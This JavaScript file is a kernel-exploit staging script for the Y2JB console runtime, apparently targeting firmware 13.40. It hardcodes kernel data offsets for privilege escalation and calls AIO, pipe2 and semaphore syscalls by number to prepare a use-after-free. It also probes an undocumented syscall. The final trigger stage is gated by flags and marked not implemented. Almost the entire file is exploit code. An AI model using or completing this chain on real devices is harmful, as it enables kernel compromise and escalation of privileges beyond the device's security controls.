// y2jb_kex_1340.js — PSAITO-built kex for the Y2JB runtime (send via payload_sender.py).
// Covers the 6 reported Y2JB blocks by construction:
//  [1] AIO holes: init-first ordering; structs mirror the proven engine layout
//      (fd@+0x20, data@+0x8, len@+0x10); every call survivor-marked.
//  [2] No call(): uses ONLY the proven full-arg syscall(num,...6BigInt) path
//      (pipe2/kqueue return real fds through it today). Never raw call().
//  [3] No ROP needed: pure-syscall chain. No gadgets, no threads, no pivot.
//  [4] No dlsym: syscalls by stable NUMBER (0x29E...); kernel DATA offsets
//      inlined below (user-provided 13.40). libkernel_base from Y2JB global.
//  [5] Sandbox: fresh-session order assumed (bases -> calltest -> this);
//      first failing call aborts the run instead of cascading.
//  [6] No exec: zero code execution needed. Reads via copyout+read64,
//      writes via kernel-side decrement/osem arithmetic only.
// DRY_RUN=true (default): stages 0-2 + validation. Fire gated behind
// DRY_RUN=false AND explicit confirm flag (two keys, no accidental panic).
(async () => {
    const DRY_RUN = true;
    const LOG_HOST = "192.168.0.163";
    const say = (s) => { try { log("[pskex] " + s); } catch (e) {} };
    const shout = (s) => { try { send_notification(s); } catch (e) {} };
    try { LOG_SERVER = "http://" + LOG_HOST + ":8080/log"; } catch (e) {}
    // Kernel DATA offsets, 13.40 (user-provided). Used at priv-esc stage only.
    const KD = { DATA: 0x00CB0000, ALLPROC: 0x03589E80, SECFLAGS: 0x01A49064,
        ROOTVNODE: 0x03DE7510, BUSDEVS: 0x02D481E8 };
    const toBig = (v) => {
        if (typeof v === "bigint") return v;
        if (typeof v === "number") return BigInt(v>>>0) | (BigInt(Math.floor(v/0x100000000))<<32n);
        if (v && typeof v.low === "number") return (BigInt(v.hi>>>0)<<32n)|BigInt(v.low>>>0);
        throw new Error("bad addr");
    };
    shout("pskex: start dry=" + DRY_RUN);
    say("kex start");
    // Stage 0: resolve libkernel base (Y2JB global, any int shape)
    let LK = 0n;
    try {
        const g = (typeof libkernel_base !== "undefined") ? libkernel_base : globalThis.libkernel_base;
        LK = toBig(g);
        say("LK=" + "0x" + LK.toString(16));
        shout("pskex: LK ok");
    } catch (e) { say("LK MISSING, stop"); shout("pskex: NOLK stop"); return; }
    const SC = async (tag, num, args) => {
        try {
            const r = await syscall(BigInt(num), ...args.map((a)=>BigInt(a)));
            say(tag + "=" + String(r)); shout(("pskex: "+tag+"="+String(r)).slice(0,100));
            return r;
        } catch (e) { say(tag+" THREW "+(e&&e.message||e)); shout("pskex: "+tag+" THREW"); return null; }
    };
    // Stage 1: init-first, then pipe, submit(valid), create, osem(valid)
    const A_INIT=0x29En, A_SUBMIT=0x295n, A_CREATE=0x29Cn, A_OSMCR=0x225n, A_CLOSE=0x06n;
    let r = await SC("init", A_INIT, [0n,0n,0n,0n,0n,0n]);
    if (r === null) return;
    const ab = malloc(8); write64(ab, 0n);
    r = await SC("pipe2", 0x2AFn, [ab,0n,0n,0n,0n,0n]);
    if (r === null) return;
    let rfd = -1;
    try {
        const fds = read64(ab);
        rfd = Number(fds & 0xFFFFFFFFn);
        say("fds rfd=" + rfd);
    } catch (e) { say("fds unreadable, stop"); return; }
    const data = malloc(64);
    for (let i = 0; i < 64; i += 8) write64(data + BigInt(i), 0n);
    const req = malloc(0x40);
    for (let i = 0; i < 0x40; i += 8) write64(req + BigInt(i), 0n);
    write32(req, rfd >= 0 ? rfd : 0);
    write64(req + 8n, data);
    write64(req + 16n, 64n);
    r = await SC("submit", A_SUBMIT, [0n,req,1n,0n,0n,0n]);
    if (r === null) return;
    r = await SC("create", A_CREATE, [1n,0n,0n,0n,0n,0n]);
    if (r === null) return;
    const nm = malloc(32);
    for (let i = 0; i < 32; i++) write8(nm + BigInt(i), 0);
    write8(nm, 87); write8(nm+1n, 65); write8(nm+2n, 75); write8(nm+3n, 69); // "WAKE"
    const at = malloc(0x20);
    for (let i = 0; i < 0x20; i++) write8(at + BigInt(i), 0);
    write32(at, 1); write32(at + 8n, 1);
    r = await SC("osem", A_OSMCR, [nm,at,0n,0n,0n,0n]);
    if (r === null) return;
    // Stage 2: 727 reachability (no wrapper needed: raw number via syscall()).
    // out = fresh malloc; success = return>=0 AND buffer changed.
    const ob = malloc(0x40);
    for (let i = 0n; i < 0x40n; i += 8n) write64(ob + i, 0xDEADBEEFn + i);
    r = await SC("dbg727", 0x2D7n, [1n,ob,0n,0n,0n,0n]);
    if (r === null) return;
    let ch = false;
    try { for (let i = 0n; i < 0x40n; i += 8n) if (read64(ob+i) !== (0xDEADBEEFn+i)) ch = true; } catch (e) {}
    say("727buf changed=" + ch);
    shout("pskex: 727buf=" + (ch?"WROTE":"clean"));
    // Fire gate: needs DRY_RUN=false + ?confirm semantics via flag below.
    const CONFIRM = false; // flip manually only after green stages above
    if (DRY_RUN || !CONFIRM) {
        say("FIRE SKIPPED (dry). Stages green => flip DRY_RUN+CONFIRM for UAF.");
        shout("pskex: dry done");
    } else {
        say("FIRE would go here (mode-0 multi_wait on live requests). NOT IMPLEMENTED in this revision.");
    }
    try { if (rfd >= 0) await syscall(A_CLOSE, BigInt(rfd), 0n,0n,0n,0n,0n); } catch (e) {}
    say("kex done");
    shout("pskex: done");
})()
